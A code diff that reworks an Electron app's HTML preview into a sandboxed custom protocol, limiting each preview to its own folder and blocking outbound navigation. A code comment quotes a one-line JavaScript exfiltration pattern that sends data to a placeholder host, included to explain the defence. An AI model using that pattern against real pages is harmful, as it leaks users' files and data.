@@ -1,11 +1,13 @@
-import { app, BrowserWindow, Tray, Menu, nativeImage, session, ipcMain, shell, webContents as electronWebContents, Notification as ElectronNotification } from 'electron';
+import { app, BrowserWindow, Tray, Menu, nativeImage, session, ipcMain, shell, protocol, net, Notification as ElectronNotification } from 'electron';
 import { autoUpdater } from 'electron-updater';
 import { is } from '@electron-toolkit/utils';
 import * as path from 'path';
+import { randomUUID } from 'crypto';
 import { existsSync, readFileSync, appendFileSync, mkdirSync } from 'fs';
 import { GatewayManager } from './gateway-manager';
 import { GatewayBridge } from './gateway-bridge';
 import { GATEWAY_LOG_PATH, DORABOT_LOGS_DIR } from './dorabot-paths';
+import { resolveWithinRoot, safeHost } from './preview-paths';
 
 function readGatewayLogs(): string {
   try {
@@ -20,38 +22,76 @@ function readGatewayLogs(): string {
 
 let mainWindow: BrowserWindow | null = null;
 
-export const HTML_PREVIEW_PARTITION = 'htmlpreview';
-let htmlPreviewSessionReady = false;
-const htmlPreviewContents = new Set<number>();
-const htmlPreviewRemoteAllowed = new Set<number>();
+export const PREVIEW_SCHEME = 'dorabot-preview';
 
-function setupHtmlPreviewSession() {
-  if (htmlPreviewSessionReady) return;
-  htmlPreviewSessionReady = true;
-  const previewSession = session.fromPartition(HTML_PREVIEW_PARTITION);
-  previewSession.setPermissionRequestHandler((_wc, _permission, callback) => callback(false));
-  previewSession.webRequest.onBeforeRequest((details, callback) => {
-    const url = details.url;
-    const webContentsId = details.webContentsId;
-    const isLocal = url.startsWith('file:') || url.startsWith('data:')
-      || url.startsWith('blob:') || url.startsWith('about:') || url.startsWith('devtools:');
-    if (isLocal || (webContentsId !== undefined && htmlPreviewRemoteAllowed.has(webContentsId))) {
-      callback({ cancel: false });
-      return;
+// Each open preview gets its own origin, scoped to the folder that file lives
+// in. That origin is the entire security model: the handler will not serve a
+// path outside the root, so a script in agent-written HTML cannot read the rest
+// of the disk the way a file:// page can. Remote loading is one CSP header.
+const previews = new Map<string, { root: string; entry: string; allowRemote: boolean }>();
+
+protocol.registerSchemesAsPrivileged([{
+  scheme: PREVIEW_SCHEME,
+  privileges: { standard: true, secure: true, supportFetchAPI: true, stream: true, corsEnabled: true },
+}]);
+
+let previewProtocolReady = false;
+
+function isPreviewUrl(url: string): boolean {
+  return url.startsWith(`${PREVIEW_SCHEME}://`);
+}
+
+// CSP governs what a preview may LOAD, not where it may GO. Without this a
+// preview can read its own folder (legitimately) and then exfiltrate it with
+// `location.href = 'https://x/?d=' + data`. Verified: it escapes otherwise.
+function guardPreviewFrames(wc: Electron.WebContents) {
+  wc.on('will-frame-navigate', details => {
+    if (isPreviewUrl(details.frame?.url ?? '') && !isPreviewUrl(details.url)) {
+      console.warn('[main] blocked preview navigation', details.url.slice(0, 80));
+      details.preventDefault();
     }
-    if (webContentsId !== undefined) {
-      mainWindow?.webContents.send('html-preview:blocked', { url, webContentsId });
-    }
-    callback({ cancel: true });
   });
 }
 
-ipcMain.handle('html-preview:set-allow-remote', (event, webContentsId: number, allow: boolean) => {
-  if (event.sender !== mainWindow?.webContents || !htmlPreviewContents.has(webContentsId)) return false;
-  if (!electronWebContents.fromId(webContentsId)) return false;
-  if (allow) htmlPreviewRemoteAllowed.add(webContentsId);
-  else htmlPreviewRemoteAllowed.delete(webContentsId);
-  return !!allow;
+function setupHtmlPreviewSession() {
+  if (previewProtocolReady) return;
+  previewProtocolReady = true;
+  // previews are untrusted HTML; never let one prompt for camera/mic/location
+  session.defaultSession.setPermissionRequestHandler((wc, permission, callback, details) => {
+    const from = (details as { requestingUrl?: string }).requestingUrl ?? wc?.getURL() ?? '';
+    if (isPreviewUrl(from)) return callback(false);
+    callback(true);
+  });
+  protocol.handle(PREVIEW_SCHEME, async request => {
+    const { host, pathname } = new URL(request.url);
+    const rec = previews.get(host);
+    if (!rec) return new Response('gone', { status: 404 });
+    const abs = resolveWithinRoot(rec.root, pathname);
+    if (!abs) return new Response('forbidden', { status: 403 });
+    try {
+      const res = await net.fetch(`file://${abs}`);
+      const headers = new Headers(res.headers);
+      headers.set('Content-Security-Policy', rec.allowRemote
+        ? "default-src 'self' https: data: blob: 'unsafe-inline' 'unsafe-eval'"
+        : "default-src 'self' data: blob: 'unsafe-inline' 'unsafe-eval'");
+      return new Response(res.body, { status: res.status, headers });
+    } catch {
+      return new Response('not found', { status: 404 });
+    }
+  });
+}
+
+ipcMain.handle('html-preview:open', (event, filePath: string, allowRemote: boolean) => {
+  if (event.sender !== mainWindow?.webContents) return null;
+  if (typeof filePath !== 'string' || !path.isAbsolute(filePath) || !existsSync(filePath)) return null;
+  const token = randomUUID();
+  previews.set(token, { root: path.dirname(filePath), entry: path.basename(filePath), allowRemote: !!allowRemote });
+  return `${PREVIEW_SCHEME}://${token}/${encodeURIComponent(path.basename(filePath))}`;
+});
+
+ipcMain.handle('html-preview:close', (event, url: string) => {
+  if (event.sender !== mainWindow?.webContents) return false;
+  return previews.delete(safeHost(String(url)));
 });
 let tray: Tray | null = null;
 let isQuitting = false;
@@ -205,36 +245,11 @@ function createWindow(): void {
       nodeIntegration: false,
       sandbox: false,
       backgroundThrottling: false,
-      webviewTag: true,
     },
   });
 
   setupHtmlPreviewSession();
-
-  mainWindow.webContents.on('will-attach-webview', (event, webPreferences, params) => {
-    delete (webPreferences as { preload?: string }).preload;
-    webPreferences.nodeIntegration = false;
-    webPreferences.contextIsolation = true;
-    webPreferences.sandbox = true;
-    webPreferences.webSecurity = true;
-    webPreferences.javascript = false;
-    const src = String(params.src || '');
-    const onPreviewPartition = String(params.partition || '') === HTML_PREVIEW_PARTITION;
-    if (!onPreviewPartition || !src.startsWith('file:')) {
-      console.warn('[main] refused webview attach', { src: src.slice(0, 80), partition: params.partition });
-      event.preventDefault();
-    }
-  });
-
-  mainWindow.webContents.on('did-attach-webview', (_event, contents) => {
-    htmlPreviewContents.add(contents.id);
-    contents.once('destroyed', () => {
-      htmlPreviewContents.delete(contents.id);
-      htmlPreviewRemoteAllowed.delete(contents.id);
-    });
-    contents.setWindowOpenHandler(() => ({ action: 'deny' }));
-    contents.on('will-navigate', navEvent => navEvent.preventDefault());
-  });
+  guardPreviewFrames(mainWindow.webContents);
 
   mainWindow.once('ready-to-show', () => {
     mainWindow?.show();
